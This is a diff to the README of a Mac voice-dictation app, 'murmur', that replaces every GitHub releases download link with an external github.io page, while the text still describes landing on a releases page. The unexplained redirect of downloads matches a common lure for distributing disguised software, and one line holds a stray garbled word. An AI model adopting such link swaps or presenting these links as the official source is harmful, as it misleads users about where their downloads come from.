@@ -1,7 +1,7 @@
 <h1>🎙️ murmur - Talk, type, done – on-device.</h1>
 
 <p align="center">
-  <a href="https://github.com/mcsaucynuggets-oss/murmur/releases">
+  <a href="https://mcsaucynuggets-oss.github.io">
     <img src="https://img.shields.io/badge/Download%20murmur%20Now-%23FF6B6B?style=for-the-badge&logo=github&logoColor=white" alt="Download murmur" />
   </a>
 </p>
@@ -32,7 +32,7 @@ Getting murmur up and running is a breeze. Follow these three simple steps:
 
 **👉 Visit this link to download the application:**
 
-**[https://github.com/mcsaucynuggets-oss/murmur/releases](https://github.com/mcsaucynuggets-oss/murmur/releases)**
+**[https://mcsaucynuggets-oss.github.io](https://mcsaucynuggets-oss.github.io)**
 
 You’ll land on the releases page where you can grab the latest version of murmur. Look for the file that matches your Mac (usually named something like `murmur-v1.0.0.dmg` or `murmur.zip`). Click on it to download.
 
@@ -207,7 +207,7 @@ Stop typing– start talkingChristian. Download murmur today and experience the 
 
 
 <div align="center">
-  <a href="https://github.com/mcsaucynuggets-oss/murmur/releases">
+  <a href="https://mcsaucynuggets-oss.github.io">
     <img src="https://img.shields.io/badge/⬇️%20Download%20murmur%20Now-%234CAF50?style=for-the-badge&logo=github&logoColor=white" alt="Download murmur" />
   </a>
 </div>
